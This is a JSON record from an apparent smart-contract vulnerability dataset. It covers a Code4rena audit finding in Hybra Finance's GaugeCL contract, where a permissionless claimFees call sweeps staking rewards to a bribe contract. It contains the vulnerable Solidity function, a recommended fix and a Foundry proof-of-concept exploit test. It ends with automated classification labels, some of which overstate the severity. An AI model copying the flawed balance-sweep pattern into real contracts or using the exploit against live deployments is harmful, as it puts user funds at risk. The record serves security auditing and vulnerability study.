@@ -1,0 +1,116 @@
+{
+  "id": "63713",
+  "extraction_type": "github_complete",
+  "source_url": "https://github.com/code-423n4/2025-10-hybra-finance/blob/6299bfbc089158221e5c645d4aaceceea474f5be/ve33/contracts/CLGauge/GaugeCL.sol# L304-L335",
+  "is_complete": true,
+  "tier": "tier_1",
+  "referenced_lines": [
+    [
+      304,
+      335
+    ]
+  ],
+  "filename": "63713_GaugeCL.sol",
+  "has_pragma": true,
+  "has_contract": true,
+  "has_function": true,
+  "balanced_braces": true,
+  "num_lines": 371,
+  "vulnerability_title": "[M-06] `ClaimFees` steals staking rewards",
+  "recommendation": {
+    "has_recommendation": true,
+    "recommendation_text": "The `_claimFees` function must be modified to only transfer the fees that are explicitly collected by the `clPool.collectFees()` call, rather than sweeping the contract\u2019s entire balance. This can be achieved by measuring the contract\u2019s balance of `token0` and `token1` immediately before and after the `collectFees()` call and only transferring the difference.\n```\n\nfunction _claimFees() internal returns (uint256 claimed0, uint256 claimed1) {\n    if (!isForPair) {\n        return (0, 0);\n    }\n\n    address _token0 = clPool.token0();\n    address _token1 = clPool.token1();\n\n    uint256 balance0Before = IERC20(_token0).balanceOf(address(this));\n    uint256 balance1Before = IERC20(_token1).balanceOf(address(this));\n\n    clPool.collectFees();\n\n    uint256 balance0After = IERC20(_token0).balanceOf(address(this));\n    uint256 balance1After = IERC20(_token1).balanceOf(address(this));\n\n    claimed0 = balance0After - balance0Before;\n    claimed1 = balance1After - balance1Before;\n\n    if (claimed0 > 0) {\n        IERC20(_token0).safeApprove(internal_bribe, 0);\n        IERC20(_token0).safeApprove(internal_bribe, claimed0);\n        IBribe(internal_bribe).notifyRewardAmount(_token0, claimed0);\n    }\n    if (claimed1 > 0) {\n        IERC20(_token1).safeApprove(internal_bribe, 0);\n        IERC20(_token1).safeApprove(internal_bribe, claimed1);\n        IBribe(internal_bribe).notifyRewardAmount(_token1, claimed1);\n    }\n\n    if (claimed0 > 0 || claimed1 > 0) {\n        emit ClaimFees(msg.sender, claimed0, claimed1);\n    }\n}\n```\n\nAdditionally, consider adding access control to the `claimFees` function (e.g., `onlyOwner` or a dedicated keeper role) to prevent potential griefing attacks and ensure it is called under intended conditions.\n\nProof of concept\n```\n\n// SPDX-License-Identifier: MIT\npragma solidity 0.8.13;\n\nimport \"forge-std/Test.sol\";\n\nimport {C4PoCTestbed} from \"./C4PoCTestbed.t.sol\";\nimport {GaugeCL} from \"../contracts/CLGauge/GaugeCL.sol\";\nimport {ICLPool} from \"../contracts/CLGauge/interface/ICLPool.sol\";\nimport {IERC20} from \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\n\n/**\n * @title C4PoC_Findings\n * @notice Proof of Concept test for finding # 3.\n * @dev All available variables from C4PoCTestbed are available here.\n */\ncontract C4PoC_Findings is C4PoCTestbed {\n    function setUp() public override {\n        super.setUp();\n        // The BribeFactoryV3 is deployed but not initialized in the testbed.\n        // We must initialize it here to set the owner, allowing createBribe to be called.\n        bribeFactoryV3.initialize(address(voter), address(gaugeManager), address(permissionsRegistry), address(tokenHandler));\n    }\n\n    /*//////////////////////////////////////////////////////////////\n                           FINDING: ClaimFees Steals Staking Rewards\n    //////////////////////////////////////////////////////////////*/\n\n    function test_PoC_Finding3_ClaimFeesStealsStakingRewards() public {\n        // 1. SETUP: Create actors, tokens, and contracts.\n        address attacker = makeAddr(\"attacker\");\n        address clPoolAddress = makeAddr(\"clPoolMock\");\n\n        // Use the testbed's `hybr` as token0/rewardToken and `rewardHybr` as token1.\n        // This avoids deploying a new MockERC20.\n        address token1 = address(rewardHybr);\n\n        // Create a real bribe contract using the factory from the testbed.\n        address internalBribe = bribeFactoryV3.createBribe(address(this), address(hybr), token1, \"cl\");\n\n        // Deploy the vulnerable GaugeCL contract.\n        GaugeCL gauge = new GaugeCL(\n            address(hybr),    // _rewardToken (same as token0)\n            address(rewardHybr),\n            address(votingEscrow),\n            clPoolAddress,\n            address(rewardsDistributor),\n            internalBribe,\n            address(0),       // _external_bribe\n            true,             // _isForPair = true is required for _claimFees to execute\n            address(clNonfungiblePositionManager),\n            address(0)        // _factory\n        );\n\n        // Define reward and fee amounts.\n        uint256 rewardsAmount = 10 ether;\n        uint256 feesAmount = 0.1 ether;\n\n        // 2. MOCKING: Set up behavior for the mock Concentrated Liquidity Pool.\n        vm.mockCall(clPoolAddress, abi.encodeWithSelector(bytes4(keccak256(\"token0()\"))), abi.encode(address(hybr)));\n        vm.mockCall(clPoolAddress, abi.encodeWithSelector(bytes4(keccak256(\"token1()\"))), abi.encode(token1));\n        // Mock collectFees to do nothing, as we will manually transfer fees to simulate the state.\n        vm.mockCall(clPoolAddress, abi.encodeWithSelector(bytes4(keccak256(\"collectFees()\"))), abi.encode(uint128(0), uint128(0)));\n\n        // Mock other functions that might be called by notifyRewardAmount\n        vm.mockCall(clPoolAddress, abi.encodeWithSelector(bytes4(keccak256(\"updateRewardsGrowthGlobal()\"))), abi.encode());\n        vm.mockCall(clPoolAddress, abi.encodeWithSelector(bytes4(keccak256(\"rollover()\"))), abi.encode(uint256(0)));\n        vm.mockCall(clPoolAddress, abi.encodeWithSelector(bytes4(keccak256(\"syncReward(uint256,uint256,uint256)\"))), abi.encode());\n\n        // 3. SCENARIO: The DISTRIBUTION contract deposits staking rewards into the gauge.\n        hybr.transfer(address(rewardsDistributor), rewardsAmount);\n\n        vm.startPrank(address(rewardsDistributor));\n        hybr.approve(address(gauge), rewardsAmount);\n        gauge.notifyRewardAmount(address(hybr), rewardsAmount);\n        vm.stopPrank();\n\n        // Pre-exploit verification: Gauge should hold only the rewards at this point.\n        assertEq(hybr.balanceOf(address(gauge)), rewardsAmount, \"Pre-exploit setup failed: Gauge should hold the staking rewards\");\n        assertEq(hybr.balanceOf(internalBribe), 0, \"Pre-exploit setup failed: Bribe contract should be empty\");\n\n        // Manually transfer fees to the gauge to simulate a state where fees have been collected\n        // but not yet claimed. This puts the contract in the vulnerable state.\n        hybr.transfer(address(gauge), feesAmount);\n        assertEq(hybr.balanceOf(address(gauge)), rewardsAmount + feesAmount, \"Vulnerable state setup failed: Gauge should hold rewards + fees\");\n\n        // 4. EXPLOIT: Attacker calls the public, permissionless claimFees() function.\n        vm.prank(attacker);\n        gauge.claimFees();\n\n        // 5. ASSERTION: Verify the exploit's success.\n        uint256 finalBribeBalance = hybr.balanceOf(internalBribe);\n        uint256 totalStolenAmount = rewardsAmount + feesAmount;\n\n        // The gauge is now empty, as all its token0 balance (rewards + newly collected fees) was swept.\n        assertEq(hybr.balanceOf(address(gauge)), 0, \"Exploit check failed: Gauge was not drained of all token0\");\n\n        // The internalBribe contract received ALL funds: both rewards and fees.\n        string memory successMessage = \"EXPLOIT SUCCESSFUL: Rewards intended for stakers were stolen by claimFees() and sent to the bribe contract.\";\n        assertEq(finalBribeBalance, totalStolenAmount, successMessage);\n    }\n}\n```\n\n**[Hybra Finance mitigated](https://github.com/code-423n4/2025-11-hybra-finance-mitigation?tab=readme-ov-file# mitigations-of-high--medium-severity-issues):**\n\n> fix - S-36 ClaimFees Steals Staking Rewards\n> fix - S-841 rollover rewardRate calcuate\n> fix - S-645 Missing unchecked block in Gauge Dependent Library Will Cause Freezing of Reward Calculations\n\n**Status:** Mitigation confirmed. Full details in the [mitigation review reports from niffylord, rayss, and ZanyBonzy](https://code4rena.com/audits/2025-11-hybra-finance-mitigation-review/submissions/S-32).\n\n---",
+    "fix_code_blocks": [
+      "function _claimFees() internal returns (uint256 claimed0, uint256 claimed1) {\n    if (!isForPair) {\n        return (0, 0);\n    }\n\n    address _token0 = clPool.token0();\n    address _token1 = clPool.token1();\n\n    uint256 balance0Before = IERC20(_token0).balanceOf(address(this));\n    uint256 balance1Before = IERC20(_token1).balanceOf(address(this));\n\n    clPool.collectFees();\n\n    uint256 balance0After = IERC20(_token0).balanceOf(address(this));\n    uint256 balance1After = IERC20(_token1).balanceOf(address(this));\n\n    claimed0 = balance0After - balance0Before;\n    claimed1 = balance1After - balance1Before;\n\n    if (claimed0 > 0) {\n        IERC20(_token0).safeApprove(internal_bribe, 0);\n        IERC20(_token0).safeApprove(internal_bribe, claimed0);\n        IBribe(internal_bribe).notifyRewardAmount(_token0, claimed0);\n    }\n    if (claimed1 > 0) {\n        IERC20(_token1).safeApprove(internal_bribe, 0);\n        IERC20(_token1).safeApprove(internal_bribe, claimed1);\n        IBribe(internal_bribe).notifyRewardAmount(_token1, claimed1);\n    }\n\n    if (claimed0 > 0 || claimed1 > 0) {\n        emit ClaimFees(msg.sender, claimed0, claimed1);\n    }\n}",
+      "// SPDX-License-Identifier: MIT\npragma solidity 0.8.13;\n\nimport \"forge-std/Test.sol\";\n\nimport {C4PoCTestbed} from \"./C4PoCTestbed.t.sol\";\nimport {GaugeCL} from \"../contracts/CLGauge/GaugeCL.sol\";\nimport {ICLPool} from \"../contracts/CLGauge/interface/ICLPool.sol\";\nimport {IERC20} from \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\n\n/**\n * @title C4PoC_Findings\n * @notice Proof of Concept test for finding # 3.\n * @dev All available variables from C4PoCTestbed are available here.\n */\ncontract C4PoC_Findings is C4PoCTestbed {\n    function setUp() public override {\n        super.setUp();\n        // The BribeFactoryV3 is deployed but not initialized in the testbed.\n        // We must initialize it here to set the owner, allowing createBribe to be called.\n        bribeFactoryV3.initialize(address(voter), address(gaugeManager), address(permissionsRegistry), address(tokenHandler));\n    }\n\n    /*//////////////////////////////////////////////////////////////\n                           FINDING: ClaimFees Steals Staking Rewards\n    //////////////////////////////////////////////////////////////*/\n\n    function test_PoC_Finding3_ClaimFeesStealsStakingRewards() public {\n        // 1. SETUP: Create actors, tokens, and contracts.\n        address attacker = makeAddr(\"attacker\");\n        address clPoolAddress = makeAddr(\"clPoolMock\");\n\n        // Use the testbed's `hybr` as token0/rewardToken and `rewardHybr` as token1.\n        // This avoids deploying a new MockERC20.\n        address token1 = address(rewardHybr);\n\n        // Create a real bribe contract using the factory from the testbed.\n        address internalBribe = bribeFactoryV3.createBribe(address(this), address(hybr), token1, \"cl\");\n\n        // Deploy the vulnerable GaugeCL contract.\n        GaugeCL gauge = new GaugeCL(\n            address(hybr),    // _rewardToken (same as token0)\n            address(rewardHybr),\n            address(votingEscrow),\n            clPoolAddress,\n            address(rewardsDistributor),\n            internalBribe,\n            address(0),       // _external_bribe\n            true,             // _isForPair = true is required for _claimFees to execute\n            address(clNonfungiblePositionManager),\n            address(0)        // _factory\n        );\n\n        // Define reward and fee amounts.\n        uint256 rewardsAmount = 10 ether;\n        uint256 feesAmount = 0.1 ether;\n\n        // 2. MOCKING: Set up behavior for the mock Concentrated Liquidity Pool.\n        vm.mockCall(clPoolAddress, abi.encodeWithSelector(bytes4(keccak256(\"token0()\"))), abi.encode(address(hybr)));\n        vm.mockCall(clPoolAddress, abi.encodeWithSelector(bytes4(keccak256(\"token1()\"))), abi.encode(token1));\n        // Mock collectFees to do nothing, as we will manually transfer fees to simulate the state.\n        vm.mockCall(clPoolAddress, abi.encodeWithSelector(bytes4(keccak256(\"collectFees()\"))), abi.encode(uint128(0), uint128(0)));\n\n        // Mock other functions that might be called by notifyRewardAmount\n        vm.mockCall(clPoolAddress, abi.encodeWithSelector(bytes4(keccak256(\"updateRewardsGrowthGlobal()\"))), abi.encode());\n        vm.mockCall(clPoolAddress, abi.encodeWithSelector(bytes4(keccak256(\"rollover()\"))), abi.encode(uint256(0)));\n        vm.mockCall(clPoolAddress, abi.encodeWithSelector(bytes4(keccak256(\"syncReward(uint256,uint256,uint256)\"))), abi.encode());\n\n        // 3. SCENARIO: The DISTRIBUTION contract deposits staking rewards into the gauge.\n        hybr.transfer(address(rewardsDistributor), rewardsAmount);\n\n        vm.startPrank(address(rewardsDistributor));\n        hybr.approve(address(gauge), rewardsAmount);\n        gauge.notifyRewardAmount(address(hybr), rewardsAmount);\n        vm.stopPrank();\n\n        // Pre-exploit verification: Gauge should hold only the rewards at this point.\n        assertEq(hybr.balanceOf(address(gauge)), rewardsAmount, \"Pre-exploit setup failed: Gauge should hold the staking rewards\");\n        assertEq(hybr.balanceOf(internalBribe), 0, \"Pre-exploit setup failed: Bribe contract should be empty\");\n\n        // Manually transfer fees to the gauge to simulate a state where fees have been collected\n        // but not yet claimed. This puts the contract in the vulnerable state.\n        hybr.transfer(address(gauge), feesAmount);\n        assertEq(hybr.balanceOf(address(gauge)), rewardsAmount + feesAmount, \"Vulnerable state setup failed: Gauge should hold rewards + fees\");\n\n        // 4. EXPLOIT: Attacker calls the public, permissionless claimFees() function.\n        vm.prank(attacker);\n        gauge.claimFees();\n\n        // 5. ASSERTION: Verify the exploit's success.\n        uint256 finalBribeBalance = hybr.balanceOf(internalBribe);\n        uint256 totalStolenAmount = rewardsAmount + feesAmount;\n\n        // The gauge is now empty, as all its token0 balance (rewards + newly collected fees) was swept.\n        assertEq(hybr.balanceOf(address(gauge)), 0, \"Exploit check failed: Gauge was not drained of all token0\");\n\n        // The internalBribe contract received ALL funds: both rewards and fees.\n        string memory successMessage = \"EXPLOIT SUCCESSFUL: Rewards intended for stakers were stolen by claimFees() and sent to the bribe contract.\";\n        assertEq(finalBribeBalance, totalStolenAmount, successMessage);\n    }\n}"
+    ]
+  },
+  "poc": {
+    "has_poc": false,
+    "poc_text": "",
+    "poc_code_blocks": []
+  },
+  "problem_code": {
+    "has_problem_code": true,
+    "source": "github_line_refs_function_scope",
+    "snippets": [
+      {
+        "function_name": "_claimFees",
+        "start_line": 303,
+        "end_line": 335,
+        "code": "\n    function _claimFees() internal returns (uint256 claimed0, uint256 claimed1) {\n        if (!isForPair) {\n            return (0, 0);\n        }\n        \n        clPool.collectFees();\n        \n        address _token0 = clPool.token0();\n        address _token1 = clPool.token1();\n        // Fetch fee from the whole epoch which just eneded and transfer it to internal Bribe address.\n        claimed0 = IERC20(_token0).balanceOf(address(this));\n        claimed1 = IERC20(_token1).balanceOf(address(this));\n\n        if (claimed0 > 0 || claimed1 > 0) {\n    \n\n            uint256 _fees0 = claimed0;\n            uint256 _fees1 = claimed1;\n\n            if (_fees0  > 0) {\n                IERC20(_token0).safeApprove(internal_bribe, 0);\n                IERC20(_token0).safeApprove(internal_bribe, _fees0);\n                IBribe(internal_bribe).notifyRewardAmount(_token0, _fees0);\n            } \n            if (_fees1  > 0) {\n                IERC20(_token1).safeApprove(internal_bribe, 0);\n                IERC20(_token1).safeApprove(internal_bribe, _fees1);\n                IBribe(internal_bribe).notifyRewardAmount(_token1, _fees1);\n            } \n            emit ClaimFees(msg.sender, claimed0, claimed1);\n        }\n    }",
+        "confidence": 97,
+        "reason": "Function enclosing GitHub-referenced vulnerable line",
+        "matched_references": [
+          [
+            304,
+            335
+          ]
+        ]
+      }
+    ]
+  },
+  "extraction_date": "2026-04-24T16:07:55.187426",
+  "validation": {
+    "content_code_consistency": {
+      "consistent": true,
+      "confidence": 95,
+      "summary_matches": true,
+      "content_matches": true,
+      "summary_reasoning": "The summary accurately describes the vulnerability in the `_claimFees` function, detailing how it allows an attacker to steal staking rewards.",
+      "content_reasoning": "The content mentions the relevant functions and variables, such as `clPool.collectFees()`, `internal_bribe`, and the balance checks that are central to the vulnerability.",
+      "functions_found": [
+        "_claimFees"
+      ],
+      "variables_found": [
+        "_token0",
+        "_token1",
+        "claimed0",
+        "claimed1"
+      ],
+      "patterns_found": [
+        "incorrect balance checks",
+        "lack of access control"
+      ],
+      "issues": []
+    },
+    "report_tag_validation": {
+      "existing_tag": "None",
+      "tag_present": false,
+      "tag_correct": false,
+      "confidence": 90,
+      "reasoning": "The report does not have a tag, which is incorrect given the severity of the vulnerability.",
+      "suggested_tag": "Critical Vulnerability",
+      "alternative_tags": [
+        "Access Control Issue",
+        "Denial of Service"
+      ],
+      "correction_explanation": "A tag is necessary to categorize the severity and type of vulnerability for better tracking and remediation."
+    },
+    "mando_classification": {
+      "primary_category": "access_control",
+      "secondary_categories": [
+        "denial_of_service"
+      ],
+      "confidence": 85,
+      "mando_applicable": true,
+      "reasoning": "The vulnerability primarily stems from a lack of access control in the `claimFees` function, allowing unauthorized users to exploit the contract."
+    },
+    "scsvs_classification": {
+      "primary_category": "G5",
+      "primary_category_name": "Access control",
+      "secondary_categories": [
+        "G4",
+        "G8"
+      ],
+      "confidence": 90,
+      "use_scsvs_instead": true,
+      "reasoning": "SCSVS provides a more granular classification that captures the access control issue and the business logic flaw leading to denial of service.",
+      "vulnerability_type": "Unauthorized access leading to fund theft and potential denial of service"
+    },
+    "fix_code_source": "provided",
+    "validated_at": "2026-04-25T16:00:03.414284",
+    "model": "gpt-4o-mini",
+    "code_input_source": "github_line_refs_function_scope"
+  }
+}
